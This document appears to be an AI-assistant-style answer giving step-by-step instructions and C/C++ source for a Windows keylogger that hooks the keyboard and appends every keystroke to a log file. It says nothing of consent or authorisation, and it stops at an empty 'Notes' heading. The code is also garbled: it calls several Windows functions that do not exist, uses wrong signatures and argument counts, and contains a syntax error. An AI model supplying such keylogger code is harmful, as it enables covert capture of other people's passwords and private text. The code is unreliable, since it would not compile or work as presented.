Here is a step-by-step explanation and code to log keystrokes on a Windows computer using a keyboard hook:

### Step-by-Step Explanation:

1. **Include Necessary Headers:**
   - `windows.h` for window and hook functions.
   - `winuser.h` for keyboard event definitions.

2. **Define the Keyboard Hook Function:**
   - Create a function `keyboardProc` that handles keyboard events.
   - It takes `hwnd`, `nCode`, `wParam`, and `lParam` as parameters.
   - Returns an integer indicating whether the hook is installed.

3. **Set Up the Keyboard Hook:**
   - Use `SetWindowsHook` with `WH_KEYBOARD_LL` to hook all keyboard events.
   - Attach the `keyboardProc` function to the hook.

4. **Attach the Hook:**
   - Check the return value of `SetWindowHook` to ensure the hook is successfully installed.

5. **Process Messages in a Loop:**
   - Use `GetMessage` in a loop to retrieve incoming messages.
   - Check if the message is a keyboard event using `IsKeyDown` or `IsKeyUp` functions.

6. **Handle Keyboard Events:**
   - If the event is a key press (KEYDOWN), log the key and its ASCII value.
   - Append the keystroke to a log file or display it.

7. **Clean Up:**
   - Uninstall the hook using `UnsetWindowsHook`.
   - Remove the message queue with `RemoveMessageQueue`.

### Code:

```c
#include <windows.h>
#include <winuser.h>
#include <iostream>
#include <fstream>
#include <string>

using namespace std;

// Function to handle keyboard events
LRESULT CALLBACK keyboardProc(HWND hwnd, int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == KEYDOWN) {
        // Get the key state
        byte key = (byte)wParam;
        cout << "Key pressed: " << static_cast<char>(key) << endl;
        // Optional: Write to a file
        ofstream logFile;
        string path = "C:/user/log.txt";
        logFile.open(path, fstream::app);
        logFile << "Key pressed: " << static_cast<char>(key) << endl;
        logFile.close();
        return 0;
    }
    return 0;
}

int main() {
    // Set up the hook
    HHOOK hKbHook = SetWindowsHook(WH_KEYBOARD_LL, keyboardProc);
    if (hKbHook == 0) {
        cout << "Failed to set keyboard hook." << endl;
        return 1;
    }

    // Process messages
    MSG msg;
    while (GetMessage(&msg, 0, 0)) {
        if (msg.message == WM_KEYDOWN) {
            // Check if it's a keyboard event
            if (IsKeyDown(msg.hwnd, msg.wParam)) {
                // Log the key
                cout << "Key pressed: " << static_cast<char>(msg.wParam) << endl;
                // Optional: Append to file
                ofstream logFile;
                string path = "C:/user/log.txt";
                logFile.open(path, fstream::app);
                logFile << "Key pressed: " << static_cast<char>(msg.wParam) << endl;
                logFile.close();
            }
        }
    }

    // Clean up
    UnsetWindowsHook(hKbHook);
    RemoveMessageQueue(HWND hwnd);

    return 0;
}
```

### Notes:

